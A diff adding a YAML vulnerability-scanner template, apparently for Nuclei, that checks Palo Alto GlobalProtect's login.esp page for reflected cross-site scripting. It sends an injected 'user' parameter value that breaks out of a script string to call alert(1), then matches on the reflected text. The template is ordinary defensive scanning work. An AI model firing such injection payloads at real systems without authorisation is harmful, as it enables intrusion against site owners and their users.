@@ -1,0 +1,15 @@
+id: globalprotect-xss
+
+info:
+  name: Global Protect XSS
+  author: glatisant
+  severity: medium
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/global-protect/login.esp?user=j%22;-alert(1)-%22x"
+    matchers:
+      - type: word
+        words:
+          - 'alert(1)'
